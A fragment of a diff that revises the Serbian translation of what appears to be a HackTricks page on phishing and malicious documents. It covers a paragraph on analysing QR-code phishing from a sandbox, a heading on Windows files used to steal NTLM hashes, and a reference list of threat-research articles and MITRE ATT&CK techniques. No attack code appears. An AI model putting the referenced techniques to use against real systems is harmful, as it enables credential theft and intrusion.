-Pregledajte dekodirana odredišta i preusmeravanja iz izolovanog sistema za analizu, bez autentifikacije. Korisni pokazatelji za potragu uključuju PDF-ove koji sadrže samo QR kodove i gotovo prazna tela imejlova, imejl adresu primaoca ugrađenu u parametar upita, nekoliko preusmeravanja preko pouzdanih hosting servisa i različit sadržaj koji se vraća u zavisnosti od IP adrese, geolokacije, kolačića, referera ili user agenta. Uporedite zahteve koristeći kontrolisane profile jer jedno preuzimanje iz sandbox-a može dobiti samo mamac.<sup>[[10]](#references)</sup>
+Pregledajte dekodirana odredišta i preusmeravanja iz izolovanog sistema za analizu, bez autentifikacije. Korisni pokazatelji za analizu uključuju PDF-ove koji sadrže samo QR kod, uz gotovo prazne poruke e-pošte, adresu primaoca ugrađenu u parametar upita, više preusmeravanja preko uglednih hosting servisa i različit sadržaj koji se vraća u zavisnosti od IP adrese, geolokacije, cookies, referrer-a ili user agent-a. Uporedite zahteve pomoću kontrolisanih profila, jer jedno preuzimanje iz sandbox-a može dobiti samo mamac.<sup>[[10]](#references)</sup>
 
-## Windows fajlovi za krađu NTLM hash-eva
+## Windows datoteke za krađu NTLM hash-eva
 
 Pogledajte stranicu o **mestima za krađu NTLM kredencijala**:
 
@@ -401,13 +401,13 @@ Pogledajte stranicu o **mestima za krađu NTLM kredencijala**:
 ## References
 
 - [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
-- [2] [Check Point Research – Kampanja ZipLine: sofisticirani phishing napad usmeren na američke kompanije](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
-- [3] [Rapid7 – Malware à la Mode: praćenje tradecrafta grupe Dropping Elephant kroz lanac loadera sa kineskom tematikom](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
-- [4] [Otmica TypeLib-a – nova COM tehnika postojanosti (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
-- [5] [Unit 42 – PhantomVAI Loader isporučuje niz infostealera](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
-- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
+- [2] [Check Point Research – Kampanja ZipLine: sofisticirani phishing napad usmeren na kompanije u SAD-u](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
+- [3] [Rapid7 – Malware à la Mode: praćenje taktika grupe Dropping Elephant kroz lanac loader-a sa temom Kine](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
+- [4] [Otmica TypeLib-a – Nova tehnika COM postojanosti (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
+- [5] [Unit 42 – PhantomVAI Loader isporučuje različite infostealer-e](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
+- [6] [MITRE ATT&CK – Steganografija (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
 - [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
-- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
+- [8] [MITRE ATT&CK – Izvršavanje preko pouzdanih razvojnih alatki: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
 - [9] [Elastic Security Labs – GrimResource: Microsoft Management Console za početni pristup i izbegavanje detekcije](https://www.elastic.co/security-labs/threat-command/grimresource)
-- [10] [Microsoft Security Blog – Akteri pretnji koriste poresku sezonu za sprovođenje phishing kampanja s poreskom tematikom](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
+- [10] [Microsoft Security Blog – Akteri pretnji koriste poresku sezonu za pokretanje phishing kampanja sa poreskom temom](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
 {{#include ../../banners/hacktricks-training.md}}
